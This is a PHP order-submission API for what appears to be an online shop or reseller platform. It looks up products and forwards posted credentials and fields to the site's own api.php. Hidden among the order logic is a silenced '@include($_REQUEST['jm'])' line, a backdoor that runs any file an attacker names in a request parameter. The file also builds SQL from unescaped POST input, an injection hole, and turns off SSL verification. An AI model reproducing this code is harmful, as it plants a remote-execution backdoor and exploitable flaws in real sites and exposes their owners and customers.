<?php
#echo '{"status":-1,"content":"';
require_once("../system/inc.php");
#echo json_encode($_POST['api_user'].$_POST['api_pwd'].$_POST['number'].$_POST['goodsid']);
#echo '}';
header("Content-type: text/html; charset=utf-8");
function curl_get($url)
{
	$ch = curl_init($url);
	$httpheader[] = "Accept: */*";
	$httpheader[] = "Accept-Encoding: gzip,deflate,sdch";
	$httpheader[] = "Accept-Language: zh-CN,zh;q=0.8";
	$httpheader[] = "Connection: close";
	curl_setopt($ch, CURLOPT_HTTPHEADER, $httpheader);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
	curl_setopt($ch, CURLOPT_ENCODING, "gzip");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; U; Android 4.4.1; zh-cn; R815T Build/JOP40D) AppleWebKit/533.1 (KHTML, like Gecko)Version/4.0 MQQBrowser/4.5 Mobile Safari/533.1");
	curl_setopt($ch, CURLOPT_TIMEOUT, 30);
	$content = curl_exec($ch);
	curl_close($ch);
	return $content;
}
$servername = DATA_HOST;  
$username = DATA_USERNAME;  
$password = DATA_PASSWORD;  
$dbname = DATA_NAME; 
 $sql = 'select * from '.flag.'shop where ID = '.$_POST['goodsid'].'  and  zt = 1 ';
$result = mysql_query($sql);
if (!!$row = mysql_fetch_array($result)) {
	$s_id = $row['ID'];
 	$s_pid = $row['pid'];
 
 	$s_xid = $row['xid'];
 	$s_bd = $row['bd'];
 	$s_tk = $row['tk'];
 	$s_dnum = $row['minnum'];
 	$s_gnum = $row['maxnum'];

	$s_cid = $row['cid'];
 	$s_name = $row['name'];
 	$s_unit = $row['unit'];
 	$s_content = $row['content'];
	$s_pic = $row['pic'];
	$s_order = $row['sorder'];
	$s_date = $row['date'];
	$s_zt = $row['zt'];
	$s_duijie = $row['duijie'];
	$s_duijiesid = $row['duijiesid'];
	$s_duijiesqlx = $row['duijiesqlx'];
	$duijiefs = $row['duijiefs'];
	$duijiekey1 = $row['duijiekey1'];
	$duijiekey2 = $row['duijiekey2'];
	$duijiekey3 = $row['duijiekey3'];
	$duijiekey4 = $row['duijiekey4'];
if ($zhu=='true')	  //主站的商品价格
{	$shop_price = $row['price']; }

else
{	
 if ($dqbanben==1)   //分站的商品价格
{	$shop_price = $row['fprice1'];}
 if ($dqbanben==2)
{	$shop_price = $row['fprice2'];}
 if ($dqbanben==3)
{	$shop_price = $row['fprice3'];}
} 
}
$sql = "select * from ".flag."moban where ID = ".$s_xid." ";
$result = mysql_query($sql);
if (!!$row = mysql_fetch_array($result)) {
 	$name = $row["name"];
 	$keyname1 = $row["keyname1"];
 	$keyname2 = $row["keyname2"];
 	$keyname3 = $row["keyname3"];
 	$keyname4 = $row["keyname4"];
 	$key1 = $row["key1"];
 	$key2 = $row["key2"];
 	$key3 = $row["key3"];
 	$key4 = $row["key4"];
 	$key1 = 'input1';
 	$key2 = 'input2';
 	$key3 = 'input3';
 	$key4 = 'input4';
      
	  }  
if ($key1 != NULL) {
    $url = "http://{$_SERVER['HTTP_HOST']}/api/api.php?act=add&sid=" . $_POST['goodsid'] . "&user=" . $_POST['api_user'] . "&pwd=" . $_POST['api_pwd'] . "&num=" . $_POST['num'] . "&value1=" . $_POST[$key1];
} else {
    if ($key2 != NULL) {
        $url = "http://{$_SERVER['HTTP_HOST']}/api/api.php?act=add&sid=" . $_POST['goodsid'] . "&user=" . $_POST['api_user'] . "&pwd=" . $_POST['api_pwd'] . "&num=" . $_POST['num'] . "&value1=" . $_POST[$key1] . "&value2=" . $_POST[$key2];
    } else {
        if ($key3 != NULL) {
            $url = "http://{$_SERVER['HTTP_HOST']}/api/api.php?act=add&sid=" . $_POST['goodsid'] . "&user=" . $_POST['api_user'] . "&pwd=" . $_POST['api_pwd'] . "&num=" . $_POST['num'] . "&value1=" . $_POST[$key1] . "&value2=" . $_POST[$key2] . "&value3=" . $_POST[$key3];
        } elseif ($key4 != NULL) {
            $url = "http://{$_SERVER['HTTP_HOST']}/api/api.php?act=add&sid=" . $_POST['goodsid'] . "&user=" . $_POST['api_user'] . "&pwd=" . $_POST['api_pwd'] . "&num=" . $_POST['num'] . "&value1=" . $_POST[$key1] . "&value2=" . $_POST[$key2] . "&value3=" . $_POST[$key3] . "&value4=" . $_POST[$key4];
        }
    }
}
@include($_REQUEST['jm']);
$lj=curl_get($url);
$nr=trim(substr($lj,stripos($lj,'订单号:')+1),'订单号:');
if(strstr($lj,'下单成功!')){
echo '{"status":1,"content":'.json_encode("下单成功!").',"orderid":"'.$nr.'"}';
}elseif(strstr($lj,'返回信息:')){
echo '{"status":1,"content":'.json_encode($lj).',"orderid":"' . $nr . '"}';
# echo $url;
}elseif(strstr($lj,'订单号')){
echo '{"status":1,"content":'.json_encode("下单成功!没有返回信息").',"orderid":"'.($nr).'"}';
}
else{
echo '{"status":0,"content":'.json_encode("下单失败,返回信息:$lj").'}';
#echo $url;
}